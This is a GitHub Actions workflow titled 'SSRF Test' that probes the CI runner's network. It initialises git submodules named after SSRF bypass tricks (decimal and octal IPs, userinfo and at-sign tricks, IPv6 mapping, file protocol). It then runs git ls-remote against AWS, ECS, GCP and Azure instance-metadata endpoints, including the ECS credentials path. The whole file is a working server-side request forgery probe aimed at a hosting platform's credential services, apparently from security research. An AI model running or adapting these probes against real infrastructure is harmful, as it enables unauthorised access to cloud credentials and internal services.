name: SSRF Test
on:
  push:
    branches: [main]
  workflow_dispatch:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          submodules: false
          lfs: false
      
      - name: Initialize submodules manually
        run: |
          # Show current .gitmodules
          echo "=== .gitmodules ==="
          cat .gitmodules
          
          # Try to init each submodule and capture errors
          echo "=== Submodule init attempts ==="
          for submod in ssrf-test localhost-test internal-test ssh-imds at-trick userinfo-bypass ipv6-mapped decimal-ip octal-ip file-protocol webhook-detect burp-detect; do
            echo "--- Trying $submod ---"
            timeout 10 git submodule update --init $submod 2>&1 || echo "Failed: $submod"
          done
          
      - name: Test direct git clone to internal IPs
        run: |
          echo "=== Testing git clone/fetch to various internal addresses ==="
          
          # IMDS direct
          timeout 5 git ls-remote http://169.254.169.254/latest/meta-data/ 2>&1 || echo "169.254.169.254 failed"
          
          # Link-local
          timeout 5 git ls-remote http://[fe80::1]/test.git 2>&1 || echo "fe80::1 failed"
          
          # AWS ECS metadata
          timeout 5 git ls-remote http://169.254.170.2/v2/credentials 2>&1 || echo "ECS metadata failed"
          
          # GCP metadata
          timeout 5 git ls-remote http://metadata.google.internal/computeMetadata/v1/ 2>&1 || echo "GCP metadata failed"
          
          # Azure IMDS
          timeout 5 git ls-remote http://169.254.169.254/metadata/instance 2>&1 || echo "Azure IMDS failed"
